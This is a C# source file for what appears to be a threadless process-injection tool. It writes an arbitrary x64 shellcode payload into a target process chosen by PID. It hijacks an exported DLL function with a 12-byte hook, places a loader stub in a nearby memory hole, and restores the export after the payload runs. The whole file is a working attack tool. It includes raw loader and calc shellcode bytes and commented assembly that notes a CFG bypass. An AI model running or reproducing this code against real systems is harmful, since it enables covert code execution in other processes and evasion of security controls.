using Mono.Options;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;

namespace ThreadlessInject;

using static Native;
using static Win32;

internal static class Program
{
    //x64 calc shellcode function with ret as default if no shellcode supplied
    private static readonly byte[] CalcX64 =
    {
        0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
        0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
        0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
        0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
        0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
        0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
        0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
        0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
        0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
    };

    private static readonly byte[] ShellcodeLoader =
    {
        /* 0000 */ 0x58, 0x48, 0x83, 0xE8, 0x0C, 0x50, 0x53, 0x56, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52,
        /* 0010 */ 0x41, 0x53, 0x5D, 0x48, 0x8B, 0xDD, 0x48, 0xBE, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 
        /* 0020 */ 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x08, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 
        /* 0030 */ 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 
        /* 0040 */ 0x83, 0xC4, 0x28, 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x03, 
        /* 0050 */ 0xB9, 0xCC, 0xBB, 0xAA, 0x99, 0x89, 0x4B, 0x08, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x08, 
        /* 0060 */ 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 
        /* 0070 */ 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 0xC4, 0x28, 0x48, 0x83, 0xEC, 0x40, 0xE8, 
        /* 0080 */ 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 
        /* 0090 */ 0x5A, 0x59, 0x5E, 0x53, 0xC3 // actual payload is appended here
    };
    
    private static IntPtr GetModuleHandle(string dll)
    {
        using var self = Process.GetCurrentProcess();
        
        foreach (ProcessModule module in self.Modules)
        {
            if (!module.ModuleName.Equals(dll, StringComparison.OrdinalIgnoreCase))
                continue;

            return module.BaseAddress;
        }
        
        return IntPtr.Zero;
    }

    private static void GenerateHook(long originalInstructions_0_8, int originalInstructions_8_B, long virtProtAddr)
    {
        // This function generates the following shellcode.
        // The hooked function export is determined by immediately popping the return address and subtracting by 12, size of
        //     movabs rax, xxxxyyyyxxxxyyyy
        //     push rax
        //     ret
        //
        // Original function arguments are pushed onto the stack to restore after the injected shellcode is executed
        // The hooked function bytes are restored to the original values (essentially a one time hook)
        // A function call is made to the injected shellcode that will follow immediately after the stub
        // Original function arguments are popped off the stack and restored to the correct registers
        // A ret back to the original unpatched export restoring program behavior as normal
        // 
        // This shellcode loader stub assumes that the injector has left the hooked function RX, so the stub has to call
        // VirtualProtect to change the hooked function to RWX, restore the original bytes, and then change it back to RX
        //
        // re-assemble:
        //   ml64 /c /nologo stub.asm && dumpbin /rawdata stub.obj > stub.dump
        //   0x" + ((("  " + (((gc stub.dump -raw) -split "RAW DATA #1")[1] -split "RAW DATA #3")[0].Trim() -split "`n") | % {$_.Substring(12, 48).Trim() -split " "}) -join ", 0x")

        /*
        .code

        MyStub PROC

            ; ==========================================
            ; PROLOG: Save registers
            ; ==========================================
            ; rbx already has the addr of the hooked function via ret
            push rsi                ; Save old rsi
            push rcx                ; Save all volatile registers
            push rdx
            push r8
            push r9
            push r10
            push r11

            ; ==========================================
            ; VIRTUALPROTECT (Change to RWX)
            ; ==========================================
            mov rsi, 0FFEEDDCCBBAA9988h    ; Store VirtProt in rsi (patched in runtime)
            sub rsp, 28h            ; Allocate shadow space 20h + 8 for oldProtect
            mov rcx, rbx            ; Arg 1: hookedFunc
            mov rdx, 12             ; Arg 2: Size
            mov r8, 40h             ; Arg 3: PAGE_EXECUTE_READWRITE (0x40)
            lea r9, [rsp]           ; Arg 4: oldProtect pointer
            call rsi                ; Call VirtualProtect
            add rsp, 28h            ; Clean up stack 

            ; ==========================================
            ; RESTORE ORIGINAL 12 BYTES in hooked func
            ; ==========================================
            mov rax, 1122334455667788h    ; First 8 bytes of original prologue (patched in runtime)
            mov QWORD PTR [rbx], rax      ; Write bytes to [rbx]
            mov eax, 99AABBCCh            ; Next 4 bytes of original prologue (patched in runtime)
            mov DWORD PTR [rbx + 8], eax  ; Write bytes to [rbx + 8]

            ; ==========================================
            ; VIRTUALPROTECT (Change back to RX)
            ; ==========================================
            sub rsp, 28h            ; Allocate shadow space 20h + 8 for oldProtect
            mov rcx, rbx            ; Arg 1: hookedFunc
            mov rdx, 12             ; Arg 2: Size
            mov r8, 20h             ; Arg 3: PAGE_EXECUTE_READ (0x20)
            lea r9, [rsp]           ; Arg 4: oldProtect pointer
            call rsi                ; Call VirtualProtect
            add rsp, 28h            ; Clean up stack

            ; ==========================================
            ; CALL THE SHELLCODE
            ; ==========================================
            sub rsp, 40h            ; Allocate shadow space
            call Payload            ; Call the actual supplied payload (call +11h)
            add rsp, 40h            ; Clean up stack

            ; ==========================================
            ; EPILOG: Restore and exit
            ; ==========================================
            pop r11
            pop r10
            pop r9
            pop r8
            pop rdx
            pop rcx
            pop rsi

            push rbx                ; rbx stills hold hookedFunc addr
            ret                     ; use push-ret to bypass CFG

        MyStub ENDP

        ; ==========================================
        ; INLINE PAYLOAD BLOCK
        ; ==========================================
        Payload PROC
            ; inserted dynamically
        Payload ENDP

        END
        */

        using var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));

        // Write the VirtualProtect address into the shellcode loader stub
        writer.Seek(0x18, SeekOrigin.Begin);
        writer.Write(virtProtAddr);
        writer.Flush();

        //Write the original 12 bytes that were in the original export prior to hooking
        writer.Seek(0x45, SeekOrigin.Begin);
        writer.Write(originalInstructions_0_8);
        writer.Seek(0x51, SeekOrigin.Begin);
        writer.Write(originalInstructions_8_B);
        writer.Flush();
    }

    private static ulong FindMemoryHole(IntPtr hProcess, ulong exportAddress, int size)
    {
        ulong remoteLoaderAddress;
        var foundMemory = false;

        for (remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
             remoteLoaderAddress < exportAddress + 0x70000000;
             remoteLoaderAddress += 0x10000)
        {
            var status = AllocateVirtualMemory(hProcess, remoteLoaderAddress, size);
            if (status != NTSTATUS.Success)
                continue;

            foundMemory = true;
            break;
        }

        return foundMemory ? remoteLoaderAddress : 0;
    }

    private static byte[] ReadPayload(string path)
    {
        if (File.Exists(path))
        {
            return File.ReadAllBytes(path);
        }

        Console.WriteLine("[=] Shellcode argument doesn't appear to be a file, assuming Base64");
        return Convert.FromBase64String(path);
    }

    private static byte[] LoadShellcode(string path)
    {
        byte[] shellcode;

        if (path == null)
        {
            Console.WriteLine("[=] No shellcode supplied, using calc shellcode");
            shellcode = CalcX64;
        }
        else
        {
            shellcode = ReadPayload(path);
        }

        return shellcode;
    }

    public static void Main(string[] args)
    {
        var showHelp = false;
        string shellcodeStr = null;
        string dll = null;
        string export = null;
        var pid = 0;

        var optionSet = new OptionSet()
            .Add("h|help", "Display this help", v => showHelp = v != null)
            .Add("x=|shellcode=", "Path/Base64 for x64 shellcode payload (default: calc launcher)",
                v => shellcodeStr = v)
            .Add<int>("p=|pid=", @"Target process ID to inject", v => pid = v)
            .Add("d=|dll=", "The DLL that that contains the export to patch (must be KnownDll)", v => dll = v)
            .Add("e=|export=", "The exported function that will be hijacked", v => export = v);

        try
        {
            optionSet.Parse(args);

            if (dll == null || pid == 0 || export == null)
            {
                Console.WriteLine("[!] pid, dll and export arguments are required");
                showHelp = true;
            }

            if (showHelp)
            {
                optionSet.WriteOptionDescriptions(Console.Out);
                return;
            }

        }
        catch (Exception e)
        {
            Console.WriteLine($"[!] Failed to parse arguments: {e.Message}");
            optionSet.WriteOptionDescriptions(Console.Out);
            return;
        }

        var hModule = GetModuleHandle(dll);

        if (hModule == IntPtr.Zero)
            hModule = LoadLibrary(dll);

        if (hModule == IntPtr.Zero)
        {
            Console.WriteLine($"[!] Failed to open handle to DLL {dll}, is the KnownDll loaded?");
            return;
        }

        var exportAddress = GetProcAddress(hModule, export);
        if (exportAddress == IntPtr.Zero)
        {
            Console.WriteLine($"[!] Failed to find export {export} in {dll}, are you sure it's correct?");
            return;
        }

        Console.WriteLine($"[=] Found {dll}!{export} @ 0x{exportAddress.ToInt64():x}");

        var status = OpenProcess(pid, out var hProcess);
        if (status != 0 || hProcess == IntPtr.Zero)
        {
            Console.WriteLine($"[!] Failed to open PID {pid}: {status}.");
            return;
        }

        Console.WriteLine($"[=] Opened process with id {pid}");

        var shellcode = LoadShellcode(shellcodeStr);

        var loaderAddress = FindMemoryHole(
            hProcess,
            (ulong)exportAddress,
            ShellcodeLoader.Length + shellcode.Length);

        if (loaderAddress == 0)
        {
            Console.WriteLine("[!] Failed to find a memory hole, bailing");
            return;
        }

        Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within PID {pid}");

        var kernel32Handle = GetModuleHandle("kernel32.dll");
        if (kernel32Handle == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to get handle to kernel32.dll");
            return;
        }
        var virtProtAddr = GetProcAddress(kernel32Handle, "VirtualProtect");
        if (virtProtAddr == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to get address of VirtualProtect");
            return;
        }

        // get the original 12 bytes of the to-be-overwritten export function
        var originalBytes_0_8 = Marshal.ReadInt64(exportAddress);
        var originalBytes_8_B = Marshal.ReadInt32(exportAddress + 0x8);
        GenerateHook(originalBytes_0_8, originalBytes_8_B, (long)virtProtAddr);

        // overwrite with the new 12 bytes to call the loader stub
        var callOpCode = new byte[] {
            0x48, 0xBB,                  // [Index 0-1]   movabs rbx, XXXX
            0, 0, 0, 0, 0, 0, 0, 0,      // [Index 2-9]   full 8-bytes addressing (where the loader may be)
            0x53,                        // [Index 10]    push rbx
            0xC3                         // [Index 11]    ret (call rbx, i.e. the loader)
        };
        // Copy the 8-byte address to the shellcode loader into indices 2 through 9
        BitConverter.GetBytes(loaderAddress).CopyTo(callOpCode, 2);

        // write the hook (call) to the loader stub
        ProtectVirtualMemory(
            hProcess,
            exportAddress,
            (uint)callOpCode.Length,
            MemoryProtection.ExecuteReadWrite,
            out var oldProtectHook);

        status = WriteVirtualMemory(
            hProcess,
            exportAddress,
            callOpCode,
            out var bytesWritten);

        if (status != NTSTATUS.Success || (int)bytesWritten != callOpCode.Length)
        {
            Console.WriteLine($"[!] Failed to write callOpCode: {status}");
            return;
        }
        
        ProtectVirtualMemory(
            hProcess,
            exportAddress,
            (uint)callOpCode.Length,
            oldProtectHook,
            out _);

        // write the shellcode loader stub + shellcode to the code cave
        var payload = ShellcodeLoader.Concat(shellcode).ToArray();

        status = ProtectVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            (uint)payload.Length,
            MemoryProtection.ReadWrite,
            out var oldProtectLoader);

        if (status != NTSTATUS.Success)
        {
            Console.WriteLine($"[!] Failed to unprotect 0x{loaderAddress:x}");
            return;
        }

        status = WriteVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            payload,
            out bytesWritten);
        
        if (status != NTSTATUS.Success || (int)bytesWritten != payload.Length)
        {
            Console.WriteLine($"[!] Failed to write payload: {status}");
            return;
        }
        
        status = ProtectVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            (uint)payload.Length,
            oldProtectLoader,
            out _);
        
        if (status != NTSTATUS.Success)
        {
            Console.WriteLine($"[!] Failed to protect 0x{loaderAddress:x}");
            return;
        }

        // and finally wait for execution
        var timer = new Stopwatch();
        int timeout = 60;
        timer.Start();
        var executed = false;

        Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");

        while (timer.Elapsed.TotalSeconds < timeout)
        {
            var bytesToRead = 8;
            var buf = Marshal.AllocHGlobal(bytesToRead);
            
            ReadVirtualMemory(
                hProcess,
                exportAddress,
                buf,
                (uint)bytesToRead,
                out var bytesRead);

            var temp = new byte[bytesRead];
            Marshal.Copy(buf, temp, 0, bytesToRead);
            var currentBytes = BitConverter.ToInt64(temp, 0);

            if (originalBytes_0_8 == currentBytes)
            {
                executed = true;
                break;
            }

            Thread.Sleep(1000);
        }

        timer.Stop();

        if (executed)
        {
            FreeVirtualMemory(
                hProcess,
                (IntPtr)loaderAddress);

            Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s, export restored");
        }
        else
        {
            Console.WriteLine("[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaning up");
        }

        CloseHandle(hProcess);
    }
}